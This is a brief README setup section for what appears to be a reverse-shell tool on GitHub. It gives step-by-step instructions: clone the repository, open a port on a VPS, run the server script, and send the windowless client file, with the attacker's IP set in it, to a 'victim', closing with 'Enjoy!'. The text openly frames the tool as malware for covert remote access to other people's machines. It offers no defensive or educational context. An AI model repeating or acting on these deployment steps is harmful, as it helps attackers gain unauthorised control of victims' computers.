## 🚀 Setup

```sh-session
> Download zip file (git clone https://github.com/DictateurMiro/reverse-shell.git)
> Open port 13037 on your vps
> Run server.py
> Send client.pyw (with the ip in the file) to your victim
> Enjoy!
```
